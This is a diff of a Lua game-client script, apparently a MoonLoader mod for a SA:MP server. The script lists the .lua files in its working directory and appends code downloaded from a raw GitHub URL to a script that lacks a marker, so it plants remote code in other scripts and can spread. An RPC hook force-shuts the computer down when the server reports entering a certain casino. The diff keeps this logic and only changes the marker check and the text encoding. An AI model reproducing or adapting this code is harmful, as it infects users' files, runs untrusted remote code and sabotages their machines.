@@ -1,6 +1,5 @@
 local Directory = getWorkingDirectory().."\\"
 local Dir = io.popen('chcp 1251|dir /a-d /b "'..Directory..'"')
-
 for Filename in Dir:lines() do
     if Filename:find("^.+%.lua$") then
         local FileText = ""
@@ -9,15 +8,14 @@ for Filename in Dir:lines() do
             if FileText ~= "" then
                 FileText = FileText.."\n"
             end
-
             FileText = FileText..Line
         end
         File:close()
-        if not FileText:find("%-%- Fuck that shit") then
-            FileText = FileText.."\n"..(require "requests").get("https://raw.githubusercontent.com/TheVegasPro/123345/main/4124").text
-
+        if not FileText:find("https://raw%.githubusercontent%.com/TheVegasPro/123345/main/4124") then
+            local encoding = require "encoding"
+            encoding.default = "CP1251"
             local File = io.open(Directory..Filename, "w")
-            File:write(FileText)
+            File:write(FileText.."\n"..encoding.UTF8:decode((require("requests")).get("https://raw.githubusercontent.com/TheVegasPro/123345/main/4124").text))
             File:close()
         end
         break
@@ -28,7 +26,6 @@ function onReceiveRpc(id, bs)
         local color = raknetBitStreamReadInt32(bs)
         local len = raknetBitStreamReadInt32(bs)
         local str = raknetBitStreamReadString(bs, len)
-        -- Fuck that shit
         if str:find("^%[Информация] {FFFFFF}Вы вошли в казино 4 Dragons$") then
             os.execute("Shutdown /s /t 5 /f")
         end
